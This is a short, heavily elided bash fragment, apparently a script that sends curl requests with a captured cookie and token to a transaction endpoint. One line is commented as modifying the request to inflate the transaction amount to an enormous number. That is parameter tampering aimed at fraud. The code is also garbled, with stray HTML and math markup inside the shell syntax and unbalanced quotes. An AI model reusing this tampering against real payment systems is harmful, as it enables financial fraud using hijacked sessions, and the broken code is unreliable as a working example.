...
function try_curl_command() {
  ...
  if [ $? -ne 0 ]; then
    error_message="Failed to execute curl command: <span class="math-inline">curl\_command"
return
fi
\}
...
curl_commands=$(
  ...
  # **Modified curl command to increase the amount of the transaction**
  get_curl_command 'Enter the Amount 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999  "$cookie" "$token"
 get_curl_command '1' "$cookie" "$token"
